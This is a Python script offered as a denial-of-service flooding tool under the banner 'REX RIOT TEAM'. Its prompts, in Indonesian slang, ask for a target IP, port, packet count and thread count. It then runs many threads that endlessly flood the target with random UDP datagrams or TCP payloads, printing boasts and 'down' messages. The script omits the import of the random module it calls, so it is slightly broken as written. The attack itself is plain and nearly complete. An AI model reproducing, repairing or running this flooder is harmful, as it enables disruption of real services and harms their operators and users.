import socket
import threading
import os,sys

os.system("clear")
print("""\033[91m

██████╗░███████╗██╗░░██╗
██╔══██╗██╔════╝╚██╗██╔╝
██████╔╝█████╗░░░╚███╔╝░
██╔══██╗██╔══╝░░░██╔██╗░
██║░░██║███████╗██╔╝╚██╗
╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

\033[0m██████╗░██╗░█████╗░████████╗
██╔══██╗██║██╔══██╗╚══██╔══╝
██████╔╝██║██║░░██║░░░██║░░░
██╔══██╗██║██║░░██║░░░██║░░░
██║░░██║██║╚█████╔╝░░░██║░░░
╚═╝░░╚═╝╚═╝░╚════╝░░░░╚═╝░░░ 

                                   
""")
ip = str(input(" IP NYA BG GANTENG >>>:"))
port = int(input(" PORT NYA BG GANTENG >>>:"))
choice = str(input(" (Gas/Tidak): >>>"))
times = int(input(" PAKET NYA BG SUHU >>>:"))
threads = int(input(" BONUS PAKET BG >>>:"))
os.system("clear")
def ddos():
	data = random._urandom(1800)
	i = random.choice(("\033[91m[Attack By]","[Attack By]","[Attack By]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" REX RIOT TEAM!!!")
		except:
			print("[!] Yeh down Asuh!!!")

def ddos2():
	data = random._urandom(180)
	i = random.choice(("\033[91m[Attack By]","[Attack By]","[Attack By]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" REX RIOT TEAM!!!")
		except:
			s.close()
			print("[!] Yeh down Asuh!!!")

def ddos3():
	data = random._urandom(16)
	i = random.choice(("\033[91m[Attack By]","[Attack By]","[Attack By]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" REX RIOT TEAM!!!")
		except:
			s.close()
			print("[!] Yeh down Asuh!!!")

for y in range(threads):
	if choice == 'Gas':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()